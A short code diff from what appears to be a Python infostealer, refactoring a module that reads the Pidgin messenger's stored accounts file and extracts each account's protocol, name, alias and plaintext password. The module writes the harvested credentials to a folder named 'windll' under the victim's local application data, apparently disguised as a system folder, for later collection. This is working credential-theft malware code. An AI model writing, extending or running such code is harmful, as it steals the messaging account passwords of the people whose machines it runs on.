@@ -14,7 +14,8 @@ import xml.etree.ElementTree as ET
 from manager.logger import Log
 
 
-def Pidgin(data):
+def Pidgin():
+    msgInfo = ""
     roaming = os.getenv('APPDATA')
     pathToLogs = f"{os.getenv('LOCALAPPDATA')}\\windll"
     directory = [
@@ -36,11 +37,11 @@ def Pidgin(data):
                     password = account.findtext('password')
                     logs.append(f"Protocol: {protocol}\nName: {name}\nAlias: {alias}\nPassword: {password}\n")
             if logs:
-                data.append("\n∟📨Pidgin")
+                msgInfo+="\n∟📨Pidgin"
                 os.mkdir(pathToLogs+"\\Pidgin\\")
                 with open(pathToLogs+"\\Pidgin\\accounts.txt", 'w', encoding='UTF-8') as f:
                     for log in logs:
                         f.write(log+'\n\n')
         except Exception as e:
             Log(f"Pidgin ---> {e}")
-    return data
+    return msgInfo
